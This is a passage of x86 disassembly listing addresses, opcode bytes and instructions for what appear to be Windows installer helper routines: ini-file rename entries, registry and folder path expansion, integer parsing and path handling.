  405e35:	ff b0 28 01 00 00    	push   0x128(%eax)
  405e3b:	56                   	push   %esi
  405e3c:	e8 22 03 00 00       	call   0x406163
  405e41:	6a 04                	push   $0x4
  405e43:	68 00 00 00 c0       	push   $0xc0000000
  405e48:	56                   	push   %esi
  405e49:	e8 8c fe ff ff       	call   0x405cda
  405e4e:	8b e8                	mov    %eax,%ebp
  405e50:	83 fd ff             	cmp    $0xffffffff,%ebp
  405e53:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  405e57:	0f 84 be 00 00 00    	je     0x405f1b
  405e5d:	6a 00                	push   $0x0
  405e5f:	55                   	push   %ebp
  405e60:	ff 15 78 80 40 00    	call   *0x408078
  405e66:	8b f8                	mov    %eax,%edi
  405e68:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  405e6c:	50                   	push   %eax
  405e6d:	6a 40                	push   $0x40
  405e6f:	ff 15 58 81 40 00    	call   *0x408158
  405e75:	8b f0                	mov    %eax,%esi
  405e77:	85 f6                	test   %esi,%esi
  405e79:	0f 84 95 00 00 00    	je     0x405f14
  405e7f:	57                   	push   %edi
  405e80:	56                   	push   %esi
  405e81:	55                   	push   %ebp
  405e82:	e8 cb fe ff ff       	call   0x405d52
  405e87:	85 c0                	test   %eax,%eax
  405e89:	0f 84 85 00 00 00    	je     0x405f14
  405e8f:	68 d4 a3 40 00       	push   $0x40a3d4
  405e94:	56                   	push   %esi
  405e95:	e8 a5 fd ff ff       	call   0x405c3f
  405e9a:	85 c0                	test   %eax,%eax
  405e9c:	75 14                	jne    0x405eb2
  405e9e:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  405ea1:	68 d4 a3 40 00       	push   $0x40a3d4
  405ea6:	50                   	push   %eax
  405ea7:	ff 15 d8 80 40 00    	call   *0x4080d8
  405ead:	83 c7 0a             	add    $0xa,%edi
  405eb0:	eb 35                	jmp    0x405ee7
  405eb2:	83 c0 0a             	add    $0xa,%eax
  405eb5:	68 d0 a3 40 00       	push   $0x40a3d0
  405eba:	50                   	push   %eax
  405ebb:	e8 7f fd ff ff       	call   0x405c3f
  405ec0:	8b e8                	mov    %eax,%ebp
  405ec2:	85 ed                	test   %ebp,%ebp
  405ec4:	74 1d                	je     0x405ee3
  405ec6:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  405ec9:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  405ecc:	eb 06                	jmp    0x405ed4
  405ece:	8a 11                	mov    (%ecx),%dl
  405ed0:	88 10                	mov    %dl,(%eax)
  405ed2:	48                   	dec    %eax
  405ed3:	49                   	dec    %ecx
  405ed4:	3b cd                	cmp    %ebp,%ecx
  405ed6:	77 f6                	ja     0x405ece
  405ed8:	2b ee                	sub    %esi,%ebp
  405eda:	45                   	inc    %ebp
  405edb:	8b c5                	mov    %ebp,%eax
  405edd:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  405ee1:	eb 06                	jmp    0x405ee9
  405ee3:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  405ee7:	8b c7                	mov    %edi,%eax
  405ee9:	53                   	push   %ebx
  405eea:	03 c6                	add    %esi,%eax
  405eec:	68 c0 26 42 00       	push   $0x4226c0
  405ef1:	50                   	push   %eax
  405ef2:	e8 9e fd ff ff       	call   0x405c95
  405ef7:	33 c0                	xor    %eax,%eax
  405ef9:	50                   	push   %eax
  405efa:	50                   	push   %eax
  405efb:	50                   	push   %eax
  405efc:	55                   	push   %ebp
  405efd:	ff 15 38 81 40 00    	call   *0x408138
  405f03:	03 fb                	add    %ebx,%edi
  405f05:	57                   	push   %edi
  405f06:	56                   	push   %esi
  405f07:	55                   	push   %ebp
  405f08:	e8 74 fe ff ff       	call   0x405d81
  405f0d:	56                   	push   %esi
  405f0e:	ff 15 5c 81 40 00    	call   *0x40815c
  405f14:	55                   	push   %ebp
  405f15:	ff 15 14 81 40 00    	call   *0x408114
  405f1b:	5f                   	pop    %edi
  405f1c:	5e                   	pop    %esi
  405f1d:	5d                   	pop    %ebp
  405f1e:	5b                   	pop    %ebx
  405f1f:	c3                   	ret
  405f20:	6a 05                	push   $0x5
  405f22:	ff 74 24 0c          	push   0xc(%esp)
  405f26:	ff 74 24 0c          	push   0xc(%esp)
  405f2a:	ff 15 dc 80 40 00    	call   *0x4080dc
  405f30:	85 c0                	test   %eax,%eax
  405f32:	75 0f                	jne    0x405f43
  405f34:	ff 74 24 08          	push   0x8(%esp)
  405f38:	ff 74 24 08          	push   0x8(%esp)
  405f3c:	e8 6f fe ff ff       	call   0x405db0
  405f41:	59                   	pop    %ecx
  405f42:	59                   	pop    %ecx
  405f43:	ff 05 d0 47 42 00    	incl   0x4247d0
  405f49:	c2 08 00             	ret    $0x8
  405f4c:	8b 15 2c 47 42 00    	mov    0x42472c,%edx
  405f52:	53                   	push   %ebx
  405f53:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  405f57:	57                   	push   %edi
  405f58:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405f5c:	f7 d2                	not    %edx
  405f5e:	8b 07                	mov    (%edi),%eax
  405f60:	c1 ea 16             	shr    $0x16,%edx
  405f63:	81 e2 00 01 00 00    	and    $0x100,%edx
  405f69:	a8 20                	test   $0x20,%al
  405f6b:	74 34                	je     0x405fa1
  405f6d:	f7 c3 00 00 00 60    	test   $0x60000000,%ebx
  405f73:	74 2c                	je     0x405fa1
  405f75:	8b cb                	mov    %ebx,%ecx
  405f77:	56                   	push   %esi
  405f78:	c1 e9 15             	shr    $0x15,%ecx
  405f7b:	be 00 03 00 00       	mov    $0x300,%esi
  405f80:	23 ce                	and    %esi,%ecx
  405f82:	3b ce                	cmp    %esi,%ecx
  405f84:	5e                   	pop    %esi
  405f85:	75 0a                	jne    0x405f91
  405f87:	8b ca                	mov    %edx,%ecx
  405f89:	f7 d1                	not    %ecx
  405f8b:	23 0d f0 47 42 00    	and    0x4247f0,%ecx
  405f91:	80 e4 fe             	and    $0xfe,%ah
  405f94:	0b c1                	or     %ecx,%eax
  405f96:	80 e4 fd             	and    $0xfd,%ah
  405f99:	81 e3 ff ff ff 9f    	and    $0x9fffffff,%ebx
  405f9f:	eb 0d                	jmp    0x405fae
  405fa1:	a9 00 00 10 00       	test   $0x100000,%eax
  405fa6:	74 06                	je     0x405fae
  405fa8:	0b 05 f0 47 42 00    	or     0x4247f0,%eax
  405fae:	8b c8                	mov    %eax,%ecx
  405fb0:	23 c2                	and    %edx,%eax
  405fb2:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  405fb8:	f7 d8                	neg    %eax
  405fba:	1b c0                	sbb    %eax,%eax
  405fbc:	89 0f                	mov    %ecx,(%edi)
  405fbe:	f7 d0                	not    %eax
  405fc0:	23 c3                	and    %ebx,%eax
  405fc2:	5f                   	pop    %edi
  405fc3:	5b                   	pop    %ebx
  405fc4:	c2 08 00             	ret    $0x8
  405fc7:	55                   	push   %ebp
  405fc8:	8b ec                	mov    %esp,%ebp
  405fca:	8d 45 10             	lea    0x10(%ebp),%eax
  405fcd:	50                   	push   %eax
  405fce:	ff 75 08             	push   0x8(%ebp)
  405fd1:	e8 76 ff ff ff       	call   0x405f4c
  405fd6:	85 c0                	test   %eax,%eax
  405fd8:	75 05                	jne    0x405fdf
  405fda:	6a 06                	push   $0x6
  405fdc:	58                   	pop    %eax
  405fdd:	eb 12                	jmp    0x405ff1
  405fdf:	ff 75 14             	push   0x14(%ebp)
  405fe2:	ff 75 10             	push   0x10(%ebp)
  405fe5:	6a 00                	push   $0x0
  405fe7:	ff 75 0c             	push   0xc(%ebp)
  405fea:	50                   	push   %eax
  405feb:	ff 15 08 80 40 00    	call   *0x408008
  405ff1:	5d                   	pop    %ebp
  405ff2:	c2 10 00             	ret    $0x10
  405ff5:	55                   	push   %ebp
  405ff6:	8b ec                	mov    %esp,%ebp
  405ff8:	8d 45 10             	lea    0x10(%ebp),%eax
  405ffb:	50                   	push   %eax
  405ffc:	ff 75 08             	push   0x8(%ebp)
  405fff:	e8 48 ff ff ff       	call   0x405f4c
  406004:	33 c9                	xor    %ecx,%ecx
  406006:	3b c1                	cmp    %ecx,%eax
  406008:	75 05                	jne    0x40600f
  40600a:	6a 06                	push   $0x6
  40600c:	58                   	pop    %eax
  40600d:	eb 15                	jmp    0x406024
  40600f:	51                   	push   %ecx
  406010:	ff 75 14             	push   0x14(%ebp)
  406013:	51                   	push   %ecx
  406014:	ff 75 10             	push   0x10(%ebp)
  406017:	51                   	push   %ecx
  406018:	51                   	push   %ecx
  406019:	51                   	push   %ecx
  40601a:	ff 75 0c             	push   0xc(%ebp)
  40601d:	50                   	push   %eax
  40601e:	ff 15 04 80 40 00    	call   *0x408004
  406024:	5d                   	pop    %ebp
  406025:	c2 10 00             	ret    $0x10
  406028:	55                   	push   %ebp
  406029:	8b ec                	mov    %esp,%ebp
  40602b:	51                   	push   %ecx
  40602c:	8d 45 18             	lea    0x18(%ebp),%eax
  40602f:	56                   	push   %esi
  406030:	50                   	push   %eax
  406031:	8b 45 18             	mov    0x18(%ebp),%eax
  406034:	f7 d8                	neg    %eax
  406036:	1b c0                	sbb    %eax,%eax
  406038:	c7 45 fc 00 04 00 00 	movl   $0x400,-0x4(%ebp)
  40603f:	25 00 01 00 00       	and    $0x100,%eax
  406044:	0d 19 00 02 00       	or     $0x20019,%eax
  406049:	50                   	push   %eax
  40604a:	ff 75 0c             	push   0xc(%ebp)
  40604d:	ff 75 08             	push   0x8(%ebp)
  406050:	e8 72 ff ff ff       	call   0x405fc7
  406055:	8b 75 14             	mov    0x14(%ebp),%esi
  406058:	85 c0                	test   %eax,%eax
  40605a:	75 3b                	jne    0x406097
  40605c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40605f:	57                   	push   %edi
  406060:	50                   	push   %eax
  406061:	8d 45 0c             	lea    0xc(%ebp),%eax
  406064:	56                   	push   %esi
  406065:	50                   	push   %eax
  406066:	6a 00                	push   $0x0
  406068:	ff 75 10             	push   0x10(%ebp)
  40606b:	ff 75 18             	push   0x18(%ebp)
  40606e:	ff 15 2c 80 40 00    	call   *0x40802c
  406074:	ff 75 18             	push   0x18(%ebp)
  406077:	8b f8                	mov    %eax,%edi
  406079:	ff 15 24 80 40 00    	call   *0x408024
  40607f:	80 a6 ff 03 00 00 00 	andb   $0x0,0x3ff(%esi)
  406086:	85 ff                	test   %edi,%edi
  406088:	5f                   	pop    %edi
  406089:	75 0c                	jne    0x406097
  40608b:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  40608f:	74 09                	je     0x40609a
  406091:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  406095:	74 03                	je     0x40609a
  406097:	80 26 00             	andb   $0x0,(%esi)
  40609a:	5e                   	pop    %esi
  40609b:	c9                   	leave
  40609c:	c2 14 00             	ret    $0x14
  40609f:	ff 74 24 08          	push   0x8(%esp)
  4060a3:	68 a4 83 40 00       	push   $0x4083a4
  4060a8:	ff 74 24 0c          	push   0xc(%esp)
  4060ac:	ff 15 74 82 40 00    	call   *0x408274
  4060b2:	83 c4 0c             	add    $0xc,%esp
  4060b5:	c2 08 00             	ret    $0x8
  4060b8:	55                   	push   %ebp
  4060b9:	8b ec                	mov    %esp,%ebp
  4060bb:	51                   	push   %ecx
  4060bc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4060bf:	53                   	push   %ebx
  4060c0:	56                   	push   %esi
  4060c1:	57                   	push   %edi
  4060c2:	33 ff                	xor    %edi,%edi
  4060c4:	80 39 2d             	cmpb   $0x2d,(%ecx)
  4060c7:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4060ce:	b0 0a                	mov    $0xa,%al
  4060d0:	b3 39                	mov    $0x39,%bl
  4060d2:	75 05                	jne    0x4060d9
  4060d4:	41                   	inc    %ecx
  4060d5:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4060d9:	80 39 30             	cmpb   $0x30,(%ecx)
  4060dc:	75 1c                	jne    0x4060fa
  4060de:	41                   	inc    %ecx
  4060df:	8a 11                	mov    (%ecx),%dl
  4060e1:	80 fa 30             	cmp    $0x30,%dl
  4060e4:	7c 09                	jl     0x4060ef
  4060e6:	80 fa 37             	cmp    $0x37,%dl
  4060e9:	7f 04                	jg     0x4060ef
  4060eb:	b0 08                	mov    $0x8,%al
  4060ed:	b3 37                	mov    $0x37,%bl
  4060ef:	80 e2 df             	and    $0xdf,%dl
  4060f2:	80 fa 58             	cmp    $0x58,%dl
  4060f5:	75 03                	jne    0x4060fa
  4060f7:	b0 10                	mov    $0x10,%al
  4060f9:	41                   	inc    %ecx
  4060fa:	0f be 11             	movsbl (%ecx),%edx
  4060fd:	41                   	inc    %ecx
  4060fe:	83 fa 30             	cmp    $0x30,%edx
  406101:	7c 0c                	jl     0x40610f
  406103:	0f be f3             	movsbl %bl,%esi
  406106:	3b d6                	cmp    %esi,%edx
  406108:	7f 05                	jg     0x40610f
  40610a:	83 ea 30             	sub    $0x30,%edx
  40610d:	eb 19                	jmp    0x406128
  40610f:	3c 10                	cmp    $0x10,%al
  406111:	75 21                	jne    0x406134
  406113:	8b f2                	mov    %edx,%esi
  406115:	83 e6 df             	and    $0xffffffdf,%esi
  406118:	83 fe 41             	cmp    $0x41,%esi
  40611b:	7c 17                	jl     0x406134
  40611d:	83 fe 46             	cmp    $0x46,%esi
  406120:	7f 12                	jg     0x406134
  406122:	83 e2 07             	and    $0x7,%edx
  406125:	83 c2 09             	add    $0x9,%edx
  406128:	0f be f0             	movsbl %al,%esi
  40612b:	0f af f7             	imul   %edi,%esi
  40612e:	03 f2                	add    %edx,%esi
  406130:	8b fe                	mov    %esi,%edi
  406132:	eb c6                	jmp    0x4060fa
  406134:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406137:	0f af c7             	imul   %edi,%eax
  40613a:	5f                   	pop    %edi
  40613b:	5e                   	pop    %esi
  40613c:	5b                   	pop    %ebx
  40613d:	c9                   	leave
  40613e:	c2 04 00             	ret    $0x4
  406141:	68 00 04 00 00       	push   $0x400
  406146:	ff 74 24 0c          	push   0xc(%esp)
  40614a:	ff 74 24 0c          	push   0xc(%esp)
  40614e:	ff 15 ac 80 40 00    	call   *0x4080ac
  406154:	c2 08 00             	ret    $0x8
  406157:	ff 25 a0 80 40 00    	jmp    *0x4080a0
  40615d:	ff 25 e0 80 40 00    	jmp    *0x4080e0
  406163:	55                   	push   %ebp
  406164:	8b ec                	mov    %esp,%ebp
  406166:	83 ec 18             	sub    $0x18,%esp
  406169:	8b 45 0c             	mov    0xc(%ebp),%eax
  40616c:	85 c0                	test   %eax,%eax
  40616e:	7d 11                	jge    0x406181
  406170:	8b 0d fc 3e 42 00    	mov    0x423efc,%ecx
  406176:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  40617d:	2b c8                	sub    %eax,%ecx
  40617f:	8b 01                	mov    (%ecx),%eax
  406181:	8b 0d 78 47 42 00    	mov    0x424778,%ecx
  406187:	53                   	push   %ebx
  406188:	56                   	push   %esi
  406189:	57                   	push   %edi
  40618a:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
  40618d:	b8 c0 36 42 00       	mov    $0x4236c0,%eax
  406192:	39 45 08             	cmp    %eax,0x8(%ebp)
  406195:	8b f8                	mov    %eax,%edi
  406197:	0f 82 eb 01 00 00    	jb     0x406388
  40619d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4061a0:	2b c8                	sub    %eax,%ecx
  4061a2:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4061a8:	0f 83 da 01 00 00    	jae    0x406388
  4061ae:	8b 7d 08             	mov    0x8(%ebp),%edi
  4061b1:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  4061b5:	e9 ce 01 00 00       	jmp    0x406388
  4061ba:	8b cf                	mov    %edi,%ecx
  4061bc:	2b c8                	sub    %eax,%ecx
  4061be:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  4061c4:	0f 8d c8 01 00 00    	jge    0x406392
  4061ca:	43                   	inc    %ebx
  4061cb:	80 fa 04             	cmp    $0x4,%dl
  4061ce:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  4061d1:	0f 83 a4 01 00 00    	jae    0x40637b
  4061d7:	0f be 43 01          	movsbl 0x1(%ebx),%eax
  4061db:	0f be 0b             	movsbl (%ebx),%ecx
  4061de:	8b f0                	mov    %eax,%esi
  4061e0:	8b d9                	mov    %ecx,%ebx
  4061e2:	83 e6 7f             	and    $0x7f,%esi
  4061e5:	83 e3 7f             	and    $0x7f,%ebx
  4061e8:	c1 e6 07             	shl    $0x7,%esi
  4061eb:	0b f3                	or     %ebx,%esi
  4061ed:	8b d9                	mov    %ecx,%ebx
  4061ef:	80 cf 80             	or     $0x80,%bh
  4061f2:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4061f5:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  4061f8:	8b d8                	mov    %eax,%ebx
  4061fa:	80 cf 80             	or     $0x80,%bh
  4061fd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406200:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  406203:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  406206:	43                   	inc    %ebx
  406207:	43                   	inc    %ebx
  406208:	80 fa 02             	cmp    $0x2,%dl
  40620b:	0f 85 17 01 00 00    	jne    0x406328
  406211:	a1 2c 47 42 00       	mov    0x42472c,%eax
  406216:	6a 02                	push   $0x2
  406218:	85 c0                	test   %eax,%eax
  40621a:	5e                   	pop    %esi
  40621b:	79 18                	jns    0x406235
  40621d:	66 3d 04 5a          	cmp    $0x5a04,%ax
  406221:	74 12                	je     0x406235
  406223:	83 7d f4 23          	cmpl   $0x23,-0xc(%ebp)
  406227:	74 0c                	je     0x406235
  406229:	83 7d f4 2e          	cmpl   $0x2e,-0xc(%ebp)
  40622d:	74 06                	je     0x406235
  40622f:	83 65 0c 00          	andl   $0x0,0xc(%ebp)
  406233:	eb 07                	jmp    0x40623c
  406235:	c7 45 0c 01 00 00 00 	movl   $0x1,0xc(%ebp)
  40623c:	83 3d c4 47 42 00 00 	cmpl   $0x0,0x4247c4
  406243:	74 03                	je     0x406248
  406245:	6a 04                	push   $0x4
  406247:	5e                   	pop    %esi
  406248:	84 c9                	test   %cl,%cl
  40624a:	79 37                	jns    0x406283
  40624c:	8b c1                	mov    %ecx,%eax
  40624e:	83 e1 3f             	and    $0x3f,%ecx
  406251:	03 0d 78 47 42 00    	add    0x424778,%ecx
  406257:	83 e0 40             	and    $0x40,%eax
  40625a:	50                   	push   %eax
  40625b:	57                   	push   %edi
  40625c:	51                   	push   %ecx
  40625d:	68 a8 83 40 00       	push   $0x4083a8
  406262:	68 02 00 00 80       	push   $0x80000002
  406267:	e8 bc fd ff ff       	call   0x406028
  40626c:	80 3f 00             	cmpb   $0x0,(%edi)
  40626f:	0f 85 9a 00 00 00    	jne    0x40630f
  406275:	ff 75 f4             	push   -0xc(%ebp)
  406278:	57                   	push   %edi
  406279:	e8 e5 fe ff ff       	call   0x406163
  40627e:	e9 87 00 00 00       	jmp    0x40630a
  406283:	83 f9 25             	cmp    $0x25,%ecx
  406286:	75 0e                	jne    0x406296
  406288:	68 00 04 00 00       	push   $0x400
  40628d:	57                   	push   %edi
  40628e:	ff 15 e4 80 40 00    	call   *0x4080e4
  406294:	eb 74                	jmp    0x40630a
  406296:	83 f9 24             	cmp    $0x24,%ecx
  406299:	75 6b                	jne    0x406306
  40629b:	68 00 04 00 00       	push   $0x400
  4062a0:	57                   	push   %edi
  4062a1:	ff 15 94 80 40 00    	call   *0x408094
  4062a7:	33 f6                	xor    %esi,%esi
  4062a9:	eb 5b                	jmp    0x406306
  4062ab:	a1 24 47 42 00       	mov    0x424724,%eax
  4062b0:	33 c9                	xor    %ecx,%ecx
  4062b2:	4e                   	dec    %esi
  4062b3:	3b c1                	cmp    %ecx,%eax
  4062b5:	74 18                	je     0x4062cf
  4062b7:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  4062ba:	74 13                	je     0x4062cf
  4062bc:	57                   	push   %edi
  4062bd:	51                   	push   %ecx
  4062be:	51                   	push   %ecx
  4062bf:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  4062c3:	ff 35 28 47 42 00    	push   0x424728
  4062c9:	ff d0                	call   *%eax
  4062cb:	85 c0                	test   %eax,%eax
  4062cd:	74 3b                	je     0x40630a
  4062cf:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4062d2:	50                   	push   %eax
  4062d3:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  4062d7:	ff 35 28 47 42 00    	push   0x424728
  4062dd:	ff 15 68 81 40 00    	call   *0x408168
  4062e3:	85 c0                	test   %eax,%eax
  4062e5:	75 1c                	jne    0x406303
  4062e7:	57                   	push   %edi
  4062e8:	ff 75 fc             	push   -0x4(%ebp)
  4062eb:	ff 15 70 81 40 00    	call   *0x408170
  4062f1:	ff 75 fc             	push   -0x4(%ebp)
  4062f4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4062f7:	ff 15 88 82 40 00    	call   *0x408288
  4062fd:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406301:	75 07                	jne    0x40630a
  406303:	80 27 00             	andb   $0x0,(%edi)
  406306:	85 f6                	test   %esi,%esi
  406308:	75 a1                	jne    0x4062ab
  40630a:	80 3f 00             	cmpb   $0x0,(%edi)
  40630d:	74 11                	je     0x406320
  40630f:	83 7d f4 1a          	cmpl   $0x1a,-0xc(%ebp)
  406313:	75 0b                	jne    0x406320
  406315:	68 d4 83 40 00       	push   $0x4083d4
  40631a:	57                   	push   %edi
  40631b:	e8 3d fe ff ff       	call   0x40615d
  406320:	57                   	push   %edi
  406321:	e8 85 00 00 00       	call   0x4063ab
  406326:	eb 44                	jmp    0x40636c
  406328:	80 fa 03             	cmp    $0x3,%dl
  40632b:	75 2e                	jne    0x40635b
  40632d:	83 fe 1d             	cmp    $0x1d,%esi
  406330:	75 0e                	jne    0x406340
  406332:	ff 35 28 47 42 00    	push   0x424728
  406338:	57                   	push   %edi
  406339:	e8 61 fd ff ff       	call   0x40609f
  40633e:	eb 11                	jmp    0x406351
  406340:	8b c6                	mov    %esi,%eax
  406342:	c1 e0 0a             	shl    $0xa,%eax
  406345:	05 00 50 42 00       	add    $0x425000,%eax
  40634a:	50                   	push   %eax
  40634b:	57                   	push   %edi
  40634c:	e8 f0 fd ff ff       	call   0x406141
  406351:	83 c6 eb             	add    $0xffffffeb,%esi
  406354:	83 fe 07             	cmp    $0x7,%esi
  406357:	73 13                	jae    0x40636c
  406359:	eb c5                	jmp    0x406320
  40635b:	80 fa 01             	cmp    $0x1,%dl
  40635e:	75 0c                	jne    0x40636c
  406360:	83 c8 ff             	or     $0xffffffff,%eax
  406363:	2b c6                	sub    %esi,%eax
  406365:	50                   	push   %eax
  406366:	57                   	push   %edi
  406367:	e8 f7 fd ff ff       	call   0x406163
  40636c:	57                   	push   %edi
  40636d:	e8 e5 fd ff ff       	call   0x406157
  406372:	03 f8                	add    %eax,%edi
  406374:	b8 c0 36 42 00       	mov    $0x4236c0,%eax
  406379:	eb 0d                	jmp    0x406388
  40637b:	75 08                	jne    0x406385
  40637d:	8a 0b                	mov    (%ebx),%cl
  40637f:	88 0f                	mov    %cl,(%edi)
  406381:	47                   	inc    %edi
  406382:	43                   	inc    %ebx
  406383:	eb 03                	jmp    0x406388
  406385:	88 17                	mov    %dl,(%edi)
  406387:	47                   	inc    %edi
  406388:	8a 13                	mov    (%ebx),%dl
  40638a:	84 d2                	test   %dl,%dl
  40638c:	0f 85 28 fe ff ff    	jne    0x4061ba
  406392:	80 27 00             	andb   $0x0,(%edi)
  406395:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406399:	5f                   	pop    %edi
  40639a:	5e                   	pop    %esi
  40639b:	5b                   	pop    %ebx
  40639c:	74 09                	je     0x4063a7
  40639e:	50                   	push   %eax
  40639f:	ff 75 08             	push   0x8(%ebp)
  4063a2:	e8 9a fd ff ff       	call   0x406141
  4063a7:	c9                   	leave
  4063a8:	c2 08 00             	ret    $0x8
  4063ab:	53                   	push   %ebx
  4063ac:	56                   	push   %esi
  4063ad:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4063b1:	57                   	push   %edi
  4063b2:	80 3e 5c             	cmpb   $0x5c,(%esi)
  4063b5:	75 15                	jne    0x4063cc
  4063b7:	80 7e 01 5c          	cmpb   $0x5c,0x1(%esi)
  4063bb:	75 0f                	jne    0x4063cc
  4063bd:	80 7e 02 3f          	cmpb   $0x3f,0x2(%esi)
  4063c1:	75 09                	jne    0x4063cc
  4063c3:	80 7e 03 5c          	cmpb   $0x5c,0x3(%esi)
  4063c7:	75 03                	jne    0x4063cc
  4063c9:	83 c6 04             	add    $0x4,%esi
  4063cc:	80 3e 00             	cmpb   $0x0,(%esi)
  4063cf:	74 0c                	je     0x4063dd
  4063d1:	56                   	push   %esi
  4063d2:	e8 6f f7 ff ff       	call   0x405b46
  4063d7:	85 c0                	test   %eax,%eax
  4063d9:	74 02                	je     0x4063dd
  4063db:	46                   	inc    %esi
  4063dc:	46                   	inc    %esi
  4063dd:	8a 06                	mov    (%esi),%al
  4063df:	8b de                	mov    %esi,%ebx
  4063e1:	84 c0                	test   %al,%al
  4063e3:	8b fe                	mov    %esi,%edi
  4063e5:	74 39                	je     0x406420
  4063e7:	55                   	push   %ebp
  4063e8:	8b 2d 2c 82 40 00    	mov    0x40822c,%ebp
  4063ee:	3c 1f                	cmp    $0x1f,%al
  4063f0:	76 22                	jbe    0x406414
  4063f2:	50                   	push   %eax
  4063f3:	68 e8 a3 40 00       	push   $0x40a3e8
  4063f8:	e8 07 f7 ff ff       	call   0x405b04
  4063fd:	80 38 00             	cmpb   $0x0,(%eax)
  406400:	75 12                	jne    0x406414
  406402:	56                   	push   %esi
  406403:	ff d5                	call   *%ebp
  406405:	2b c6                	sub    %esi,%eax
  406407:	50                   	push   %eax
  406408:	56                   	push   %esi
  406409:	57                   	push   %edi
  40640a:	e8 86 f8 ff ff       	call   0x405c95
  40640f:	57                   	push   %edi
  406410:	ff d5                	call   *%ebp
  406412:	8b f8                	mov    %eax,%edi
  406414:	56                   	push   %esi
  406415:	ff d5                	call   *%ebp
  406417:	8b f0                	mov    %eax,%esi
  406419:	8a 06                	mov    (%esi),%al
  40641b:	84 c0                	test   %al,%al
  40641d:	75 cf                	jne    0x4063ee
  40641f:	5d                   	pop    %ebp
  406420:	80 27 00             	andb   $0x0,(%edi)
  406423:	57                   	push   %edi
  406424:	53                   	push   %ebx
  406425:	ff 15 e4 81 40 00    	call   *0x4081e4
  40642b:	8b f8                	mov    %eax,%edi
  40642d:	8a 07                	mov    (%edi),%al
  40642f:	3c 20                	cmp    $0x20,%al
  406431:	74 04                	je     0x406437
  406433:	3c 5c                	cmp    $0x5c,%al
  406435:	75 07                	jne    0x40643e
  406437:	80 27 00             	andb   $0x0,(%edi)
  40643a:	3b df                	cmp    %edi,%ebx
  40643c:	72 e5                	jb     0x406423
  40643e:	5f                   	pop    %edi
  40643f:	5e                   	pop    %esi
  406440:	5b                   	pop    %ebx
  406441:	c2 04 00             	ret    $0x4
  406444:	56                   	push   %esi
  406445:	be 80 25 42 00       	mov    $0x422580,%esi
  40644a:	56                   	push   %esi
  40644b:	ff 74 24 0c          	push   0xc(%esp)
  40644f:	ff 15 2c 81 40 00    	call   *0x40812c
  406455:	83 f8 ff             	cmp    $0xffffffff,%eax
  406458:	74 0b                	je     0x406465
  40645a:	50                   	push   %eax
  40645b:	ff 15 34 81 40 00    	call   *0x408134
  406461:	8b c6                	mov    %esi,%eax
  406463:	eb 02                	jmp    0x406467
  406465:	33 c0                	xor    %eax,%eax
  406467:	5e                   	pop    %esi
  406468:	c2 04 00             	ret    $0x4
  40646b:	55                   	push   %ebp
  40646c:	8b ec                	mov    %esp,%ebp
  40646e:	81 ec 20 01 00 00    	sub    $0x120,%esp
  406474:	56                   	push   %esi
  406475:	be 04 01 00 00       	mov    $0x104,%esi
  40647a:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  406480:	56                   	push   %esi
  406481:	50                   	push   %eax
  406482:	ff 15 e4 80 40 00    	call   *0x4080e4
  406488:	3b c6                	cmp    %esi,%eax
  40648a:	5e                   	pop    %esi
  40648b:	76 02                	jbe    0x40648f
  40648d:	33 c0                	xor    %eax,%eax
  40648f:	85 c0                	test   %eax,%eax
  406491:	74 0e                	je     0x4064a1
  406493:	80 bc 05 df fe ff ff 	cmpb   $0x5c,-0x121(%ebp,%eax,1)
  40649a:	5c 
  40649b:	74 04                	je     0x4064a1
  40649d:	33 c9                	xor    %ecx,%ecx
  40649f:	eb 03                	jmp    0x4064a4
  4064a1:	33 c9                	xor    %ecx,%ecx
  4064a3:	41                   	inc    %ecx
  4064a4:	ff 75 08             	push   0x8(%ebp)
  4064a7:	8d 89 14 a0 40 00    	lea    0x40a014(%ecx),%ecx
  4064ad:	8d 84 05 e0 fe ff ff 	lea    -0x120(%ebp,%eax,1),%eax
  4064b4:	51                   	push   %ecx
  4064b5:	68 f4 a3 40 00       	push   $0x40a3f4
  4064ba:	50                   	push   %eax
  4064bb:	ff 15 74 82 40 00    	call   *0x408274
  4064c1:	83 c4 10             	add    $0x10,%esp
  4064c4:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4064ca:	6a 08                	push   $0x8
  4064cc:	6a 00                	push   $0x0
  4064ce:	50                   	push   %eax
  4064cf:	ff 15 50 81 40 00    	call   *0x408150
  4064d5:	c9                   	leave
  4064d6:	c2 04 00             	ret    $0x4
